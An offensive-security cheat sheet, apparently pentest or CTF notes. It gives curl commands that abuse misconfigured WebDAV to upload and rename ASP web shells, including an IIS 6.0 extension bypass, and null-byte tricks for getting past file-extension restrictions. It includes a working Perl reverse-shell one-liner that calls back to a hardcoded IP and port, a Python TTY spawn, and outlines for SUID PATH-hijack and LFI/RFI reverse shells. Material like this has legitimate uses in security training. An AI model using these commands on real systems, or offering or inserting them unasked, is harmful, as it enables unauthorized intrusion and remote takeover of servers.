# cURL

IF MODIFY, PUT, MOVE, DELE etc HEADERS are misconfigured.

#### UPLOAD
```
Curl -T ‘location of file’ ‘http://target/name
e.g
      curl -T 'shell.asp' 'http://<IPADDRESS>/shell.asp'
```

#### RENAME

CAN USE THIS TO BYPASS FILE EXTENSIONS Restrictions

```
curl -X MOVE --header 'Destination:http://<TARGETIPADDRESS>/shell.asp;.txt' 'http://<TARGETIPADDRESS>/shell.txt'
e.g
      changing from shell.txt --> shell.asp;.txt

p.s bypasses IIS 6.0 File extensions 
```

#### CREATE DIRECTORY
```
curl -X MKCOL 'http://<IPADDRESS>/test'
```

# NULL BYTES

Bypass File Extentension Restrictions

```
%23
%00
```

# ESCAPE JAIL SHELL

# USING PERL REVERSE SHELL INTO PYTHON TTY

```
/usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.21.31:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
/usr/bin/python -c 'import pty; pty.spawn("/bin/sh")'

```

# EXPLOITING SUID FILES SYMLINK
Using strings  "exploit.file"
  - Find a dependency

Change EXPORT path to /tmp/
  - Create a binary file with the same name as dependency
  - Have this file create a reverse shell
Run the misconfigured SUID file, it will return a reverse shell using SUID


# EXPLOITING LFI / RFI
#### BASIC LFI
```
     Log Poisoning
     Using LFI to run an already uploaded backdoor
```
#### BASIC RFI
```
Create a .php reverse shell
Rename file extension to .txt  [ May need to append null bytes depending if headers are included, check apache access logs ]
Navigate to file through RFI exploit
```
